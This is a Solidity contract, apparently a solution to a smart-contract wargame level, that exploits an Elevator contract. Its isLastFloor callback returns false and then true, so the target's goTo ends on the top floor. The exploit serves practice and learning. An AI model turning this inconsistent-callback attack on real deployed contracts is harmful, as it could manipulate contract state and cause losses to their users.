// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "./Elevator.sol";

contract ElevatorExploit is Building {
    bool private top = false;

    function run(address _target, uint _floor) external {
        Elevator(_target).goTo(_floor);
    }

    // elevator contract - building interface
    function isLastFloor(uint _floor) external override returns (bool) {
        if (!top) {
            top = true; // on the first check, return false, then, prepare the state for the next check (top floor)
            return !top;
        } else {
            return top;
        }
    }
}
